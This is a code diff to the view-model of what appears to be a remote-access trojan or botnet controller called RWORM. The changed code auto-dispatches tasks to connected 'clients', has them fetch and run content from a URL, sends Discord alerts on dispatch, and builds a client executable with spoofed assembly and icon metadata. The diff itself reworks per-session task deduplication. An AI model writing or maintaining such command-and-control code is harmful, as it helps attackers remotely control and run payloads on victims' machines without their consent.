@@ -362,12 +362,16 @@ namespace RWORM.GUI.ViewModels
 
                 OnPropertyChanged(nameof(ClientCount));
 
-                // Auto-run tasks on newly connected clients
+                // Auto-run tasks on newly connected clients (per-session key: ID or GUID:LastSeen)
                 foreach (var task in Tasks.ToList())
                 {
                     foreach (var c in Clients.ToList())
                     {
-                        if (!task.ExecutedGuids.Contains(c.Guid))
+                        string sessionKey = !string.IsNullOrWhiteSpace(c.Id)
+                            ? c.Id
+                            : $"{c.Guid}:{c.LastSeen:yyyyMMddHHmmss}";
+
+                        if (!task.ExecutedKeys.Contains(sessionKey))
                         {
                             _ = ExecuteTaskOnClientAsync(task, c);
                         }
@@ -623,8 +627,12 @@ namespace RWORM.GUI.ViewModels
         // ── Tasks ─────────────────────────────────────────────────────────────
         private async Task ExecuteTaskOnClientAsync(TaskModel task, ClientModel client)
         {
-            if (task.ExecutedGuids.Contains(client.Guid)) return;
-            task.ExecutedGuids.Add(client.Guid);
+            string sessionKey = !string.IsNullOrWhiteSpace(client.Id)
+                ? client.Id
+                : $"{client.Guid}:{client.LastSeen:yyyyMMddHHmmss}";
+
+            if (task.ExecutedKeys.Contains(sessionKey)) return;
+            task.ExecutedKeys.Add(sessionKey);
 
             _ = SendTaskDiscordAlertAsync(
                 "📋 Task Dispatched to Client",
@@ -661,7 +669,7 @@ namespace RWORM.GUI.ViewModels
                     await _server.RunUrlTaskAsync(client.Guid, task.Source);
                 }
 
-                task.ExecutedCount = task.ExecutedGuids.Count;
+                task.ExecutedCount++;
                 task.Status = $"Sent → {task.ExecutedCount} client(s)";
             }
             catch (Exception ex)
@@ -784,7 +792,10 @@ namespace RWORM.GUI.ViewModels
 
             foreach (var c in targets)
             {
-                SelectedTask.ExecutedGuids.Remove(c.Guid);
+                string sessionKey = !string.IsNullOrWhiteSpace(c.Id)
+                    ? c.Id
+                    : $"{c.Guid}:{c.LastSeen:yyyyMMddHHmmss}";
+                SelectedTask.ExecutedKeys.Remove(sessionKey);
                 await ExecuteTaskOnClientAsync(SelectedTask, c);
             }
 
@@ -1233,7 +1244,7 @@ namespace RWORM.GUI.ViewModels
                 // Configure Client .csproj with optional Assembly and Icon metadata
                 var clientCsprojPath = System.IO.Path.Combine(baseDir, "Client", "RWORM.Client.csproj");
                 var originalCsproj = System.IO.File.ReadAllText(clientCsprojPath);
-                string tempIconDest = null;
+                string? tempIconDest = null;
 
                 try
                 {
